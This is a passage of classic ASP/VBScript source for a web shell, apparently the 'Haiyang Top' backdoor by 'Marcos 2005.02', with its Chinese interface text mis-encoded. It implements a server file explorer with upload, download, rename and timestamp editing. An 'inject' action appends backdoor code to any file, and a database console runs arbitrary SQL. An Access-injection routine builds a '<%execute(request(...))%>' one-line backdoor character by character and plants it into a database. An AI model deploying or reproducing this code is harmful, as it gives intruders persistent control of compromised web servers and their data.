               i = InStrB(i, fileContent, chrB(13) & chrB(10) & chrB(13) & chrB(10)) + 4 - 1
               j = InStrB(i, fileContent, info) - 1
               streamT.type = 1
               streamT.Mode = 3
               streamT.Open
               stream.position = i
               .CopyTo streamT, j - i - 2
               If overWrite = "true" thEN
                   streamT.SaveToFile fileName, 2
                Else
                   streamT.SaveToFile fileName
               END If
               If Err.Number = 3004 thEN
                   Err.CleaR
                   fileName = fileName & "\" & SpliT(theFile, "\")(ubound(SPLIt(theFile ,"\")))
                   If overWrite="true" theN
                       streamT.SaveToFile fileName, 2
                    Else
                       streamT.SaveToFile fileName
                   ENd If
               END If
               chkErr(Err)
               ECHo("<script lanGuaGe=""javascript"">alert('ÎÄ¼þÉÏ´«³É¹¦!\n" & Replace(fileName, "\", "\\") & "');</script>")
               streamT.Close
               .Close
           End With

           Set stream = Nothing
           Set streamT = Nothing
       EnD SuB
       Function getFileIcon(extName)
           selECT Case lCAse(extName)
               Case "vbs", "h", "c", "cfg", "pas", "bas", "log", "asp", "txt", "php", "ini", "inc", "htm", "html", "xml", "conf", "config", "jsp", "java", "htt", "lst", "aspx", "php3", "php4", "js", "css", "asa"
                   getFileIcon = "Wingdings>2"
               Case "wav", "mp3", "wma", "ra", "wmv", "ram", "rm", "avi", "mpg"
                   getFileIcon = "Webdings>¡¤"
               Case "jpg", "bmp", "png", "tiff", "gif", "pcx", "tif"
                   getFileIcon = "'webdings'>&#159;"
               Case "exe", "com", "bat", "cmd", "scr", "msi"
                   getFileIcon = "Webdings>1"
               Case "sys", "dll", "ocx"
                   getFileIcon = "Wingdings>&#255;"
               Case Else
                   getFileIcon = "'Wingdings 2'>/"
           ENd SeleCt
       END Function
       SuB PageAppFileExplorer()
           ResPonSE.Buffer = True
           If isDebugMode = False then
               On Error Resume Next
           eNd If
           dIm strExtName, thePath, objFolder, objMember, strDetails, strPath, strNewName
           DIm intI, theAct, strTmp, strFolderList, strFileList, strFilePath, strFileName, strParentPath
           shOwtitlE("Shell.ApplicationÎÄ¼þä¯ÀÀÆ÷(&stream)")
           theAct = Request("theAct")
           strNewName = ReQUeST("newName")
           thePath = Replace(LTrim(ReqUEsT("thePath")), "\\", "\")

           If theAct <> "upload" Then
               If rEqUEst.Form.Count > 0 tHEn
                   theAct = REqUEst.form("theAct")
                   thePath = Replace(LTrim(rEQUesT.FOrm("thePath")), "\\", "\")
               ENd If
           eND If
           ECho "<style>BodY{margin:8;}</style>"

           SELECt Case theAct
               Case "openUrl"
                   openUrl(thePath)
               Case "showEdit"
                   Call showEdit(thePath, "stream")
               Case "saveFile"
                   Call saveToFile(thePath, "stream")
               Case "copyOne", "cutOne"
                   If thePath = "" Then
                       alertThenClose("²ÎÊý´íÎó!")
                       REspONSe.eND
                   end If
                   SEssIon(m & "appThePath") = thePath
                   sEsSIon(m & "appTheAct") = theAct
                   alertThenClose("²Ù×÷³É¹¦,ÇëÕ³Ìù!")
               Case "pastOne"
                   appDoPastOne(thePath)
                   alertThenClose("Õ³Ìù³É¹¦,ÇëË¢ÐÂ±¾Ò³²é¿´Ð§¹û!")
               Case "rename"
                   appRenameOne(thePath)
               Case "DOwNThefILE"
                   DoWNTHeFIlE(thePath)
               Case "theAttributes"
                   appTheAttributes(thePath)
               Case "showUpload"
                   Call showUpload(thePath, "AppFileExplorer")
               Case "upload"
                   streamUpload(thePath)
                   Call showUpload(thePath, "AppFileExplorer")
               Case "inject"
                   strTmp = streamLoadFromFile(thePath)
                   fSOsaVEtOfILE thePath, strTmp & strBackDoor
                   alertThenClose("ºóÃÅ²åÈë³É¹¦!")
           end SElecT

           If theAct <> "" ThEN
               REsPonsE.eND
           end If


           Set objFolder = saX.NameSpace(thePath)

           If reQUEST.fOrM.Count > 0 thEn
               REdiRecTTO("?pageName=AppFileExplorer&thePath=" & UrlEncode(thePath))
           ENd If
           eCHo "<InPuT TyPE=hIdden NAme=usePath /><inpUT tYpE=hiddeN vAluE=AppFileExplorer NAME=pageName />"
           eChO "<iNPUT TypE=HIDDEn Value=""" & HtmlEncode(thePath) & """ nAMe=truePath />"
           ECHO "<div style='leFt:0px;wIDth:100%;heIGht:48px;position:absolute;top:2px;' ID=fileExplorerTools>"
           echO "<INPut tyPE=BUttON valuE=' ´ò¿ª ' onCLICk='openUrl();'>"
           EcHO "<iNpUt TyPe=BuTTOn valUE=' ±à¼ ' OncLICK='editFile();'>"
           eCho "<InpUt TypE=bUTtOn VaLUE=' ¸´ÖÆ ' oNcLICk=appDoAction('copyOne');>"
           eCHO "<inPut tYPE=BuTTon VALUE=' ¼ôÇÐ ' ONcLiCk=appDoAction('cutOne');>"
           ECHO "<INPut tYPe=BUTtoN vaLuE=' Õ³Ìù ' OncLIcK=appDoAction2('pastOne');>"
           eCho "<InpuT TyPe=bUTtoN vALUe=' ÉÏ´« ' ONclicK='upTheFile();'>"
           ecHo "<iNpUT tYpE=button vALUE=' ÏÂÔØ ' onClick='dowNthEfiLe();'>"
           eCho "<Input tYPe=bUTTon vaLUE=' ÊôÐÔ ' onClICK='appTheAttributes();'>"
           eCHo "<InPuT TyPE=buttoN VALUe=' ²åÈë ' ONclICk=appDoAction('inject');>"
           EcHO "<INpUT tYpE=BuTtoN vALUe='ÖØÃüÃû' OnCLick='appRename();'>"
           eCho "<INpuT TypE=bUTtON VALue='ÎÒµÄµçÄÔ' OnclICK=location.href='?pageName=AppFileExplorer&thePath='>"
           eCho "<INpUT typE=BUTToN VALUE='¿ØÖÆÃæ°å' ONClIck=location.href='?pageName=AppFileExplorer&thePath=::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\::{21EC2020-3AEA-1069-A2DD-08002B30309D}'>"
           EcHO "<FOrM MeThoD=post action='?pageName=AppFileExplorer'>"
           EChO "<INPUT tyPe=BUTtON VaLuE=' ºóÍË ' OnCLiCK='this.disabled=true;history.bacK();' />"
           EcHO "<inpUt TYPe=buTTON value=' Ç°½ø ' ONClIck='this.disabled=true;history.go(1);' />"
           eCHO "<input TYPE=Button VALue=Õ¾µã¸ù OnclICK=location.href=""?pageName=AppFileExplorer&thePath=" & URLEncode(Server.mappATh("\")) & """;>"
           EcHo "<iNPUt style='WIdTh:60%;' Name=thePath vAlUe=""" & HtmlEncode(thePath) & """ />"
           eCHo "<InPUt Type=submit vALuE=' GO.' /><iNpUt TYPe=buTTOn Value=' Ë¢ÐÂ ' ONcLick='location.reload();'></FORM><hr/>"
           ecHo "</div><div style='hEIght:50px;'></div>"
           echo "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"
           For eACh objMember In objFolder.Items
               intI = intI + 1
               If intI > 200 Then
                   intI = 0
                   RESPonSe.Flush()
               enD If

               If objMember.IsFolder = True ThEN
                   If lEfT(objMember.Path, 2) = "::" TheN
                       strPath = URLEncode(objMember.Path)
                    Else
                       strPath = URLEncode(objMember.Path) & "%5C"
                   enD If
                   strFolderList = strFolderList & "<span Id=""" & strPath & """ ondblclick='changeThePath(this);' oNcLIck='changeMyClass(this);'><font CLAss=font face=Wingdings>0</font><bR/>" & objMember.naME & "</span>"
                Else
                   strDetails = objFolder.GetDetailsOf(objMember, -1)
                   strFilePath = objMember.Path
                   strFileName = mId(strFilePath, InStrRev(strFilePath, "\") + 1)
                   strExtName = SPLIT(strFileName, ".")(uBOund(spLit(strFileName, ".")))
                   strFileList = strFileList & "<span TITlE=""" & strDetails & """ ondblclick='openUrl();' ID=""" & URLEncode(strFilePath) & """ oNClick='changeMyClass(this);'><font CLASS=font face=" & getFileIcon(strExtName) & "</font><BR/>" & strFileName & "</span>"
               eND If
           Next
           chkErr(Err)
           strParentPath = getParentPath(thePath)
           If thePath <> "" aND leFt(thePath, 2) <> "::" tHEN
               strFolderList = "<span Id=""" & URLEncode(strParentPath) & """ ondblclick='changeThePath(this);' ONcliCk='changeMyClass(this);'><font ClAss=font face=Wingdings>0</font><Br/>..</span>" & strFolderList
           End If
           eChO "<div Id=FileList>"
           echO strFolderList & strFileList
           eCHO "</div>"
           EChO "<hr/>Powered By Marcos 2005.02"

           Set objFolder = Nothing
       END sub
       Function getParentPath(strPath)
           If rIghT(strPath, 1) = "\" Then
               strPath = Left(strPath, Len(strPath) - 1)
           end If
           If Len(strPath) = 2 tHEn
               getParentPath = " "
            Else
               getParentPath = LeFt(strPath, InStrRev(strPath, "\"))
           End If
       EnD Function
       Function streamSaveToFile(thePath, fileContent)
           Dim stream
           If isDebugMode = False Then
               On Error Resume Next
           eNd If
           Set stream = Server.cREAtEOBjEcT("adODb.stream")
           With stream
               .TypE=2
               .Mode=3
               .Open
               chkErr(Err)
               .Charset="gb2312"
               .WriteText fileContent
               .saveToFile thePath, 2
               .Close
           END With
           Set stream = Nothing
       eND Function
       Sub appDoPastOne(thePath)
           If isDebugMode = False tHen
               On Error Resume Next
           enD If
           dIM strAct, strPath
           Dim objTargetFolder
           strAct = sEssion(m & "appTheAct")
           strPath = sessIOn(m & "appThePath")

           If strAct = "" oR strPath = "" THeN
               alertThenClose("²ÎÊý´íÎó,Õ³ÌùÇ°ÇëÏÈ¸´ÖÆ/¼ôÇÐ!")
               Exit suB
           End If

           If iNSTR(LcASe(thePath), Lcase(strPath)) > 0 ThEN
               alertThenClose("Ä¿±êÎÄ¼þ¼ÐÔÚÔ´ÎÄ¼þ¼ÐÄÚ,·Ç·¨²Ù×÷!")
               Exit SUb
           END If
           strPath = trimThePath(strPath)
           thePath = trimThePath(thePath)
           Set objTargetFolder = saX.NameSpace(thePath)
           If strAct = "copyOne" tHEN
               objTargetFolder.CopyHere(strPath)
            Else
               objTargetFolder.MoveHere(strPath)
           end If
           chkErr(Err)

           Set objTargetFolder = Nothing
       end suB
       suB appTheAttributes(thePath)
           If isDebugMode = False tHen
               On Error Resume Next
           enD If
           dIm i, strSth, objFolder, objItem, strModifyDate
           strModifyDate = rEqUESt("ModifyDate")

           thePath = trimThePath(thePath)
           If thePath = "" Then
               alertThenClose("Ã»ÓÐÑ¡ÔñÈÎºÎÎÄ¼þ(¼Ð)!")
               Exit sUb
           eND If
           strSth = Left(thePath, InStrRev(thePath, "\"))
           Set objFolder = saX.NameSpace(strSth)
           chkErr(Err)
           strSth = SPlIT(thePath, "\")(UboUNd(spLIt(thePath, "\")))
           Set objItem = objFolder.ParseName(strSth)
           chkErr(Err)
           If isDate(strModifyDate) thEN
               objItem.ModifyDate = strModifyDate
               alertThenClose("ÐÞ¸Ä³É¹¦!")
               Set objItem = Nothing
               Set objFolder = Nothing
               Exit Sub
           enD If

   '       strSth = objFolder.GetDetailsOf(objItem, -1)
   '       strSth = Replace(strSth, chr(10), "<Br/>")
           For i = 1 To 8
               strSth = strSth & "<Br/>ÊôÐÔ(" & i & "): " & objFolder.GetDetailsOf(objItem, i)
           Next
           strSth = Replace(strSth, "ÊôÐÔ(1)", "´óÐ¡")
           strSth = Replace(strSth, "ÊôÐÔ(2)", "ÀàÐÍ")
           strSth = Replace(strSth, "ÊôÐÔ(3)", "×îºóÐÞ¸Ä")
           strSth = Replace(strSth, "ÊôÐÔ(8)", "ËùÓÐÕß")
           strSth = strSth & "<FOrM meThOd=POST>"
           strSth = strSth & "<InPUt tYpE=hiDDeN NAmE=theAct vAlue=theAttributes>"
           strSth = strSth & "<InPUT tYPE=HidDEN Name=thePath vAlue=""" & thePath & """>"
           strSth = strSth & "<Br/>×îºóÐÞ¸Ä: <INPUT size=30 VALuE='" & objFolder.GetDetailsOf(objItem, 3) & "' NamE=ModifyDate />"
           strSth = strSth & "<INPUt tYPe=submit valUE=' ÐÞ¸Ä '>"
           strSth = strSth & "</FoRM>"
           ECHO strSth

           Set objItem = Nothing
           Set objFolder = Nothing
       end suB
       SUb appRenameOne(thePath)
           If isDebugMode = False tHen
               On Error Resume Next
           eNd If
           dim strSth, fileName, objItem, objFolder
           fileName = reQUeSt("fileName")

           thePath = trimThePath(thePath)
           strSth = Left(thePath, InStrRev(thePath, "\"))
           Set objFolder = saX.NameSpace(strSth)
           chkErr(Err)
           strSth = spLIT(thePath, "\")(UBounD(SPLiT(thePath, "\")))
           Set objItem = objFolder.ParseName(strSth)
           chkErr(Err)
           strSth = sPLIt(thePath, ".")(UbOund(split(thePath, ".")))

           If fileName <> "" tHEN
               objItem.nAMe = fileName
               chkErr(Err)
               alertThenClose("ÖØÃüÃû³É¹¦,Ë¢ÐÂ±¾Ò³¿ÉÒÔ¿´µ½Ð§¹û!")
               Set objItem = Nothing
               Set objFolder = Nothing
               Exit sUB
           EnD If

           ECHo "<form MEtHOd=pOST>ÖØÃüÃû:"
           eCho "<inPut tYPe=HiDdeN Name=theAct valUe=rename>"
           echo "<InpUt TyPE=HIdDEN nAmE=thePath vaLuE=""" & thePath & """>"
           eCHO "<br/><iNpUT size=30 VAlue=""" & objItem.nAMe & """ NamE=fileName />"
           If InStr(strSth, ":") <= 0 thEn
               eCho "." & strSth
           enD If
           ecHO "<hr/><InPUT tYPE=submit ValUE=' ÐÞ¸Ä '>" & strJsCloseMe
           EchO "</FOrm>"

           Set objItem = Nothing
           Set objFolder = Nothing
       enD SuB
       Function streamLoadFromFile(thePath)
           dIm stream
           If isDebugMode = False THEn
               On Error Resume Next
           EnD If
           Set stream = Server.crEaTeOBject("ADoDb.stream")
           With stream
               .tyPE=2
               .Mode=3
               .Open
               .LoadFromFile thePath
               .LoadFromFile thePath
               If ReqUEsT("pageName") <> "TxtSearcher" tHeN
                   chkErr(Err)
               eND If
               .Charset="gb2312"
               .Position=2
               streamLoadFromFile=.ReadText()
               .Close
           eND With
           Set stream = Nothing
       End Function
       sUb pageMsDataBase()
           DIm theAct, sqlStr
           theAct = ReQuEst("theAct")
           sqlStr = ReqUeST("sqlStr")

           sHowtItLe("mdb+mssqlÊý¾Ý¿â²Ù×÷Ò³")

           If sqlStr = "" ThEN
               If sEssiOn(m & "sqlStr") = "" THeN
                   sqlStr = "e:\hytop.mdb»òsql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
                Else
                   sqlStr = SeSSion(m & "sqlStr")
               enD If
           EnD If
           SesSion(m & "sqlStr") = sqlStr

           eCHO "<style>BodY{margin:8;}</style>"
           eCHO "<foRM mEThod=poSt action='?pageName=MsDataBase&theAct=showTables' OnSubMit='this.Submit.disabled=true;'>"
           ECho "<a href='?pageName=MsDataBase'>mdb+mssqlÊý¾Ý¿â²Ù×÷</a><Br/>"
           eChO "<InpUt Name=sqlStr TyPe=text id=sqlStr vAluE=""" & sqlStr & """ size=60 style='WIdTH:80%;'>"
           ECHo "<InPut Name=theAct Type=HIddEN vaLuE=showTables><BR/>"
           EcHO "<INput tyPE=Submit nAmE=Submit ValuE=' Ìá½» '>"
           Echo "<iNPut TYPE=ButTOn NaMe=Submit2 VALUE=' ²åÈë ' oNCLiCk=""if(confirm('ÕâÀïÊÇÔÚACESSÊý¾ÝÀï²åÈëº£Ñô¶¥¶ËÍøASPºóÃÅ\nÄ¬ÈÏÃÜÂëÊÇ" & clientPassword & "\nºóÃÅ²åÈëºó¿ÉÒÔÊ¹ÓÃµÄÇ°ÌáÊÇ\nÊý¾Ý¿âÊÇaspºó×º, ²¢ÇÒÃ»ÓÐ´íÂÒasp´úÂë\nÈ·ÈÏ²Ù×÷Âð?')){location.href='?pageName=MsDataBase&theAct=inject&sqlStr='+this.FoRM.sqlStr.VAlue;this.disabled=true;}"">"
           ECHo "<inPuT TyPe=BUTTOn vALUE=' Ê¾Àý ' oNcLICK=""this.FoRm.sqlStr.vAlue='e:\\HYTop.mdb»òsql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';"">"
           eChO "</fOrm>"
           echO "<hr/>×¢: ²åÈëÖ»Õë¶ÔACCESS²Ù×÷, Òªä¯ÀÀACCESSÔÚ±íµ¥ÖÐµÄÐ´·¨ÊÇ""d:\bbs.mdb"", SQL¾Ý¿âÐ´·¨ÊÇ""sql:Á¬½Ó×Ö·û´®"", ²»ÒªÍüÐ´sql:¡£<hr/>"
           SeLECT Case theAct
               Case "showTables"
                   showTables()
               Case "query"
                   showQuery()
               Case "inject"
                   acCESsiNjEct()
           END SEleCt

           echO "Powered By Marcos 2005.02"
       eNd Sub
       Sub showTables()
           If isDebugMode = False TheN
               On Error Resume Next
           ENd If
           dIM conn, sqlStr, rsTable, rsColumn, connStr, tablesStr
           sqlStr = reQuesT("sqlStr")
           If LCase(left(sqlStr, 4)) = "sql:" THEn
               connStr = MiD(sqlStr, 5)
            Else
               connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
           END If
           Set conn = Server.CReATeObjEct("AdOdb.Connection")

           conn.Open connStr
           chkErr(Err)

           tablesStr = getTableList(conn, sqlStr, rsTable)

           echo "<a href=""?pageName=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>Êý¾Ý¿â±í½á¹¹²é¿´:</a><Br/>"
           EchO tablesStr & "<hr/>"
           ECho "<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>×ªµ½SQLÃüÁîÖ´ÐÐ</a><hr/>"
           Do Until rsTable.Eof
               Set rsColumn = conn.OpenSchema(4, Array(Empty, Empty, rsTable("Table_naMe").vALUe))
               eCHo "<TAble border=0 CelLPaDDinG=0 CELLSpaCinG=0><TR><td Height=22 colsPaN=6><b>" & rsTable("TaBLE_nAME") & "</b></Td>"
               echo "</tr><TR><tD COlSpaN=6><hr/></TD></TR><tr aliGN=CeNtER>"
               ECHO "<Td>×Ö¶ÎÃû</tD><TD>ÀàÐÍ</Td><TD>´óÐ¡</TD><tD>¾«¶È</td><td>ÔÊÐíÎª¿Õ</tD><Td>Ä¬ÈÏÖµ</Td></tr>"
               eCHO "<tr><Td COLSpAN=6><hr/></Td></tr>"
               Do Until rsColumn.Eof
                   EChO "<Tr AligN=cenTEr>"
                   echo "<TD aLIGN=LeFT>&nbsp;" & rsColumn("Column_NAmE") & "</td>"
                   EchO "<Td widtH=80>" & GeTDaTAtYpe(rsColumn("Data_tyPE")) & "</TD>"
                   ECHO "<td wIdtH=70>" & rsColumn("Character_Maximum_Length") & "</Td>"
                   eCHo "<td WIdTh=70>" & rsColumn("Numeric_Precision") & "</Td>"
                   EchO "<TD wIdTH=70>" & rsColumn("Is_Nullable") & "</TD>"
                   ecHo "<tD wIdth=80>" & rsColumn("Column_Default") & "</Td>"
                   ECho "</Tr>"
                   rsColumn.MoveNext
               Loop

               EChO "<tr><td cOlspaN=6><hr/></TD></tr></TablE>"
               rsTable.MoveNext
           Loop
           ECHo "<hr/>"
           conn.Close
           Set conn = Nothing
           Set rsTable = Nothing
           Set rsColumn = Nothing
       End sUb
       SUb showQuery()
           If isDebugMode = False tHen
               On Error Resume Next
           eNd If
           diM i, j, rs, sql, page, conn, sqlStr, connStr, rsTable, tablesStr, theTable
           sql = rEquEst("sql")
           page = RequesT("page")
           sqlStr = REqUesT("sqlStr")
           theTable = ReQueSt("theTable")

           If Not IsNumeric(page) Or page = "" ThEN
               page = 1
           End If

           If sql = "" And theTable <> "" THen
               sql = "select top " & dbSelectNumber & " * from [" & theTable & "]"
           End If

           If lcAsE(LefT(sqlStr, 4)) = "sql:" tHEn
               connStr = MID(sqlStr, 5)
            Else
               connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
           End If
           Set rs = Server.CReATeobJect("AdOdB.RecordSet")
           Set conn = Server.cReatEObJeCt("adODB.Connection")

           conn.Open connStr
           chkErr(Err)

           tablesStr = getTableList(conn, sqlStr, rsTable)
           EcHo "<a href=""?pageName=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>Êý¾Ý¿â±í½á¹¹²é¿´:</a><bR/>"
           EChO tablesStr & "<hr/>"
           Echo "<a href=?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & ">SQLÃüÁîÖ´ÐÐ¼°²é¿´</a>"
           ECHO "<Br/><forM MethOd=pOSt action=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>"
           EcHO "<iNpuT naMe=sql tYpE=text id=sql vAlue=""" & HtmlEncode(sql) & """ size=60>"
           EcHo "<INpuT tyPe=Submit NAmE=Submit4 vaLUe=Ö´ÐÐ²éÑ¯><hr/>"
           If sql <> "" aND lefT(LCAsE(sql), 7) = "sELeCT " thEN
               rs.Open sql, conn, 1, 1
               chkErr(Err)
               rs.PageSize = 20
               If Not rs.Eof THen
                   rs.AbsolutePage = page
               end If
               If rs.Fields.Count>0 TheN
                   eCHO "<bR><tABle border=""1"" celLpADDING=""0"" CEllsPACinG=""0"" WiDTH=""98%"">"
                   eCho "<Tr>"
                   eChO "<Td HeiGhT=""22"" AlIgn=""CEntEr"" clAss=""tr"" colspaN=""" & rs.Fields.Count & """>SQL²Ù×÷ - Ö´ÐÐ½á¹û</td>"
                   eCHO "</tr>"
                   EcHo "<TR>"
                   For j = 0 To rs.Fields.Count-1
                       ecHo "<tD HEIgHT=""22"" aLIGn=""CEnter"" CLaSs=""Td""> " & rs.Fields(j).naMe & " </td>"
                   Next
                   For i = 1 To 20
                       If rs.Eof THen
                           Exit For
                       enD If
                       EcHo "</TR>"
                       eCHo "<tr valign=top>"
                       For j = 0 To rs.Fields.Count-1
                           eCHO "<td HeIGHt=""22"" alIgN=""cenTeR"">" & HtmlEncode(fixNull(rs(j))) & "</TD>"
                       Next
                       eCho "</TR>"
                       rs.MoveNext
                   Next
               eND If
               ECHO "<tr>"
               eCho "<Td HEIGhT=""22"" AligN=""CenTER"" cLAss=""td"" ColSpAn=""" & rs.Fields.Count & """>"
               For i = 1 To rs.PageCount
                   ECHo Replace("<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & "&page=" & i & """><font {$font" & i & "}>" & i & "</font></a> ", "{$font" & page & "}", "CLaSs=warningColor")
               Next
               ECHo "</Td></Tr></Table>"
               rs.Close
            Else
               If sql <> "" THen
                   conn.Execute(sql)
                   chkErr(Err)
                   EcHO "<CENTEr><Br>Ö´ÐÐÍê±Ï!</cEnteR>"
               EnD If
           EnD If
           echo "</FOrM><hr/>"
           conn.Close
           Set rs = Nothing
           Set conn = Nothing
           Set rsTable = Nothing
       EnD sub
       Function getdATATypE(typeId)
           SElECT Case typeId
               Case 130
                   GETDAtATYpe = "ÎÄ±¾"
               Case 2
                   gEtdATaTypE = "ÕûÐÍ"
               Case 3
                   GetDataTYpE = "³¤ÕûÐÍ"
               Case 7
                   geTdATatYpe = "ÈÕÆÚ/Ê±¼ä"
               Case 5
                   gEtDAtaTyPe = "Ë«¾«¶ÈÐÍ"
               Case 11
                   geTdATAtYPE = "ÊÇ/·ñ"
               Case 128
                   GEtdaTatYpE = "OLE ¶ÔÏó"
               Case Else
                   gETdATATYPe = typeId
           enD sELecT
       end Function
       Sub AccESSInjECt()
           If isDebugMode = False TheN
               On Error Resume Next
           eNd If
           Dim rs, conn, sqlStr, connStr
           sqlStr = rEQueSt("sqlStr")
           If lcASe(lefT(sqlStr, 4)) = "sql:" THEn
               showErr("²åÈëÖ»¶ÔACCESSÊý¾Ý¿âÓÐÐ§!")
            Else
               connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
           enD If
           Set rs = Server.creatEoBJeCt("ADodB.RecordSet")
           Set conn = Server.CREaTEoBJect("adOdb.Connection")
           conn.Open connStr
           chkErr(Err)
           If notdownloadsExists = True THen
               conn.Execute("drop TaBle notdownloads")
           enD If
           conn.Execute("create tabLe notdownloads(notdownloads oleobject)")
           rs.Open "notdownloads", conn, 1, 3
           rs.AddNew
           rs("notdownloads").AppendChunk(ChrB(Asc("<")) & ChrB(Asc("%")) & ChrB(Asc("e")) & ChrB(Asc("x")) & ChrB(Asc("e")) & ChrB(Asc("c")) & ChrB(Asc("u")) & ChrB(Asc("t")) & ChrB(Asc("e")) & ChrB(Asc("(")) & ChrB(Asc("r")) & ChrB(Asc("e")) & ChrB(Asc("q")) & ChrB(Asc("u")) & ChrB(Asc("e")) & ChrB(Asc("s")) & ChrB(Asc("t")) & ChrB(Asc("(")) & ChrB(Asc("""")) & ChrB(Asc(clientPassword)) & ChrB(Asc("""")) & ChrB(Asc(")")) & ChrB(Asc(")")) & ChrB(Asc("%")) & ChrB(Asc(">")) & ChrB(Asc(" ")))
           rs.Update
           rs.Close

           eChO "<script lanGuage=""javascript"">alert('²åÈë³É¹¦!');history.back();</script>"

           conn.Close
           Set rs = Nothing
           Set conn = Nothing
       END Sub
       Function getTableList(conn, sqlStr, rsTable)
           Set rsTable = conn.OpenSchema(20, Array(Empty, Empty, Empty, "TAbLe"))
           Do Until rsTable.Eof
               getTableList = getTableList & "<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&theTable=" & UrlEncode(rsTable("tABLe_nAMe")) & """>[" & rsTable("taBLe_NaMe") & "]</a>&nbsp;"
               rsTable.MoveNext
           Loop
           rsTable.MoveFirst
       end Function
       sUB PageTxtSearcher()
           rESpONsE.Buffer = True
           Server.ScriptTimeOut = 5000
           Dim keyword, theAct, thePath, theFolder
           theAct = request("theAct")
           keyword = Trim(ReQUeST("keyword"))
           thePath = Trim(REQueSt("thePath"))

           shOwtITLe("ÎÄ±¾ÎÄ¼þËÑË÷Æ÷")

           If thePath = "" THEN
               thePath = Server.MaPpATh("\")
           ENd If

           eCho "FSOÎÄ¼þËÑË÷:"
           echO "<hr/>"
           ecHO "<foRm NamE=FOrm1 METHod=posT action=?pageName=TxtSearcher&theAct=fsoSearch oNsuBmIt=this.Submit.disabled=true>"
           EChO "Â·¾¶: <inpuT NaMe=thePath tYPE=text ValUe=""" & HtmlEncode(thePath) & """ id=thePath size=61><bR/>"
           eCHo "¹Ø¼ü×Ö: <inpUt nAmE=keyword TyPe=text vALUe=""" & HtmlEncode(keyword) & """ iD=keyword size=60>"
           echo "<InPuT TYpE=submit NaME=Submit VALUE=¸øÎÒËÑ>"
           eCHO "</forM>"
           eCHo "<hr/>"
           EchO "Shell.Application &amp; aDOdB.StreamÎÄ¼þËÑË÷:"
           eCHO "<hr/>"
           eCHO "<FoRM NAme=form1 MEthOD=post action=?pageName=TxtSearcher&theAct=saSearch oNSUbMiT=this.Submit2.disabled=true>"
           ECho "Â·¾¶: <InPuT naME=thePath tYpe=text VaLUe=""" & HtmlEncode(thePath) & """ iD=thePath size=61><bR/>"
           EchO "¹Ø¼ü×Ö: <iNPUt NaME=keyword tYPE=text vAlUE=""" & HtmlEncode(keyword) & """ iD=keyword size=60>"
           ECHO "<iNput TypE=submit nAMe=Submit2 VALUE=¸øÎÒËÑ>"
           ECho "</form>"
           ECho "<hr/>"

           If theAct = "fsoSearch" anD keyword <> "" theN
               Set theFolder = fsoX.GetFolder(thePath)
               Call searchFolder(theFolder, keyword)
               Set theFolder = Nothing
           enD If

           If theAct = "saSearch" anD keyword <> "" then
               Call appSearchIt(thePath, keyword)
           eNd If

           EChO "<hr/>Powered By Marcos 2005.02"
       enD sUb
       Sub searchFolder(folder, str)
           dIm ext, TItLE, theFile, theFolder
           For eAch theFile In folder.Files
               ext = LcASE(spLIT(theFile.Path, ".")(uboUnd(SpLIT(theFile.Path, "."))))
               If instr(LcasE(theFile.NAME), LcaSE(str)) > 0 thEn
                   eCHO FiLeLink(theFile, "")
               enD If
               If ext = "asp" Or ext = "asa" OR ext = "cer" or ext = "cdx" ThEn
                   If SEaRChFILE(theFile, str, tITle, "fso") THEN
                       echO FIleLInk(theFile, TItLe)
                   EnD If
               ENd If
           Next
           rESpONSe.Flush()
           For eAch theFolder In folder.subFolders
               searchFolder theFolder, str
           Next
       end sub

       Function SEaRCHfIle(f, s, titlE, meThoD)
           If isDebugMode = False tHEn
               On Error Resume Next
           eNd If
           DIm theFile, content, pos1, pos2

           If meTHoD = "fso" THEn
               Set theFile = fsoX.OpenTextFile(f.Path)
               content = theFile.ReadAll()
               theFile.Close
               Set theFile = Nothing
            Else
               content = streamLoadFromFile(f.Path)
           ENd If

           If Err THEN
               Err.cLEar
               content = ""
           eNd If

           sEArcHFiLE = iNsTr(1, content, S, vbTextCompare) > 0
           If sEArcHfIle THen
               pos1 = InsTR(1, content, "<tItle>", vbTextCompare)
               pos2 = Instr(1, content, "</TItlE>", vbTextCompare)
               tiTLE = ""
               If pos1 > 0 AnD pos2 > 0 THen
                   TitLe = MId(content, pos1 + 7, pos2 - pos1 - 7)
               end If
           EnD If
       eNd Function

       Function filELiNk(f, tiTLE)
           FilelInk = f.Path
           If TItLE = "" tHeN
               tITlE = f.nAme
           End If
           fILelInk = "<li><font color=ff0000>" & tiTLe & "</font> " & filElINk & "</li>"
       End Function

       sub appSearchIt(thePath, theKey)
           DIM TitLE, extName, objFolder, objItem, fileName
           Set objFolder = saX.NameSpace(thePath)

           For EaCh objItem In objFolder.Items
               If objItem.IsFolder = True THeN
                   Call appSearchIt(objItem.Path, theKey)
                   ReSPonSe.Flush()
                Else
                   extName = LCasE(Split(objItem.Path, ".")(UbOUNd(SpliT(objItem.Path, "."))))
                   fileName = SplIt(objItem.Path, "\")(UBOUnD(splIT(objItem.Path, "\")))
                   If INStr(lcasE(fileName), lCaSE(theKey)) > 0 tHEN
                       echo FILELInK(objItem, "")
                   EnD If
                   If extName = "asp" oR extName = "asa" Or extName = "cer" Or extName = "cdx" thEN
                       If SearCHfILE(objItem, theKey, tItle, "application") TheN
                           echo FIlELInk(objItem, TItle)
                       End If
                   End If
               EnD If
           Next
       END sUB
       suB PageOtherTools()
           DIm theAct
           theAct = ReqUEst("theAct")
